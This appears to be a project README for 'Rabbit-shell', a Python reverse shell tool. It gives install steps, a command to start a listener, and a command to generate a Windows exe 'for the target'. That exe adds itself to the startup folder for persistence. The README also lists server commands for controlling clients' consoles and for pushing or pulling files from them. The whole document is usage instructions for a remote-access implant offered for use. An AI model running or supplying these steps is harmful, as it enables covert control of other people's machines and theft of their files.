# Rabbit-shell

###### Rabbit shell reverse shell tool.





##  Installation.

```bash
git clone https://github.com/greedalbadi/rabbit-shell.git
cd rabbit-shell
pip install -r requirements.txt
```

###### The go to tool file is rabbit.py.





## Run server and start listening.

```bash
python rabbit.py --server -a 192.168.0.111 -p 9999
```

> - --server is args container
> - -a is server or device ip address
> - -p is wich port you'll be listening to

###### There'll be a seperate socket for file transfering the port is whaever enter - 1, If main server port 9999

###### file transfer port well be 9998, the files are going to trans to wherever your location is.



## Generate exe for the target.

```bash
python rabbit.py --client -a 192.168.0.111 -p 9999
```

> - --client is args container
> - -a is server or device ip address
> - -p is wich port you'll be listening to
> - -i (optional) exe icon
> - -n (optional) exe name

###### This will generate an exe inside a dist directory you may delete build folder, when the exe runs It'll create

###### a shortcut in startup folder if the system is windows.



## Commands to use from server side.



### To request server information.

```bash
>: server
```

###### Server host and port also the tool version and tool name.

### To list all clients.

```bash
>: list
```

###### List online and offline clients use, device address, and more.

### To set and controll a client console by client use number from the list.

```
>: set 0
```

###### To controle client console you can git client set number from using the command list

###### and use the command >: set (client use number).

### Quit client session.

```bash
>: quit
```

###### Quit client console without losing connection with client, used to things like changing to another set or gain info.

### Send file to client.

```bash
>: file:filename
```

###### 

### Request file from client.

```bash
reqfile:filename
```













## About.

by [@greedalbadi](https://www.instagram.com/greedalbadi/)

This tool uses MIT license.

made with depression <3
